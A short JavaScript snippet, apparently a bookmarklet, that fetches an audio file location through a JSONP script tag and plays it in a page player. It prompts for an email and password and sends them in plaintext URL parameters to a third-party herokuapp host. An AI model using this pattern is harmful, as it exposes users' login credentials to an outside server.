function aesh(data){
  data.location && (
    $('.playerContainer').html(
      '<audio src="' + data.location + '" controls></audio>'
    )
  )
}

c=document.createElement("script"),
c.src='https://stark-cliffs-87419.herokuapp.com/scripts/clondl?id='
  +(document.location.href.split('=')[1])
  + '&email=' + prompt('email')
  + '&password=' + prompt('password')
  + '&callback=aesh',
c.src&&(o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(c,o));
